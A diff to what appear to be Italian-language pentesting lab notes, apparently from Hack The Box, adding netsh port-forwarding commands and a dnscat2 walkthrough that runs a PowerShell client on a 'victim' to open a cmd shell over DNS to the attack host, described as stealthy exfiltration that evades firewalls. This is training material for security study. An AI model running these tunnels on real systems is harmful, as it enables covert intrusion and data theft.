@@ -363,3 +363,50 @@ Puo' essere molto utile per automatizzare esecuzione di iptables e aggiungere pi
 
 ### COnnettersi ad un webserver usando HTTP_Proxy & NTLM Auth
 `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`
+
+
+# Port Forwarding with Windows Netsh
+
+**Netsh** e' un windows command line tool che aiuta a fare configurazioni di rete
+
+### USare Netsh per fare port forward
+`C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`
+
+### Verifying port forward
+`C:\Windows\system32> netsh.exe interface portproxy show v4tov4`
+
+
+# DNS Tunneling with Dnscat2
+
+Dnscat2 e' un tunneling tool che usa il protocollo DNS per mandare dati tra due host. Usa un encrypted C2 chalnnel e manda i dati dentro i record TXT.
+
+Tipicamente ogni environment Active Directory ha il suo server DNS quindi quelli dentro chiameranno dei server DNS interni. Pero' con dnscat2 l' address resolution e' richiesta ad un server esterno.
+
+Dnscat2 puo' essere un approccio molto stealthy per esfiltrare dati ed evadere firewall detection.
+
+Ad esemio possiamo usare dnscat2 server sul nostro attack host e il client sulla vittima.
+
+```
+j4k1dibe@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
+### Starting dnscat2 server
+`j4k1dibe@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
+
+### Running dnscat2 on victim windows
+
+`j4k1dibe@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git`, PRima scarico su attack host
+
+`PS C:\htb> Import-Module .\dnscat2.ps1`, lo scarico sulla vittima ed eseguo
+`PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd `
+
+su **preshared secret** ci va il secret prima generato dal server.
+
+`dnscat2> ?`. Listing options
+
+### Avviare una shell/windows
+`dnscat2> window -i 1`
